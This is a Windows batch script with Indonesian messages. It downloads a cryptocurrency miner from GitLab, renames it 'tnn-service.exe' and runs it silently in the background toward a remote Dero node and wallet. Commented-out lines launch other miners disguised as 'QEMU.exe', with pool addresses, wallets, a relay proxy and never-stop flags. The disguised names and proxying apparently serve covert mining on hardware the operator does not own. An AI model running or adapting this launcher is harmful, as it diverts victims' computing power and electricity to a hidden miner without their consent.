#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomscash --pool 51.79.215.200:17019 --disable-gpu --wallet scash1qf7kn4cwmxx2wsz665ucg29xx4kfaqesx9a8s85.sato --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 5 --proxy 47.239.161.149:1111
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomx --pool us.0xpool.io:3333 --disable-gpu --wallet 0x4367d94a61C3714Cfd58DcFbCAf65D7A0be4Ee7D --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 5 --proxy 47.239.161.149:1111
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -b 47.239.161.149:1111 -m nicehash -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a randomx -k
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a rx/0 -k
#C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 5 --never-stop --restart-on-zero-hashrate

@echo off
setlocal

echo Mengunduh file...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.5.4/downloads/Tnn-miner-win64-v0.5.4.zip','Tnn.zip')"
if %errorlevel% neq 0 (
  echo Gagal mengunduh. Periksa koneksi atau URL.
  exit /b 1
)

echo Mengekstrak...
powershell -Command "Expand-Archive -Path 'Tnn.zip' -DestinationPath '.' -Force"
if %errorlevel% neq 0 (
  echo Gagal mengekstrak.
  exit /b 1
)

echo Menghapus file ZIP...
del /f /q Tnn.zip

echo Menyiapkan executable...
REM jangan gunakan nama file yang meniru proses sistem
if exist "tnn-miner-cpu.exe" (
  rename "tnn-miner-cpu.exe" "tnn-service.exe"
) else (
  echo File tnn-miner-cpu.exe tidak ditemukan.
  exit /b 1
)

echo Membuat folder log...
if not exist ".\logs" mkdir logs

echo Menjalankan proses (log ke logs\run.log)...
REM jalankan di background dengan redirect output
start "" /b .\tnn-service.exe --daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --threads 5 > ".\logs\run.log" 2>&1

echo Selesai. Cek logs\run.log untuk output & error.
endlocal
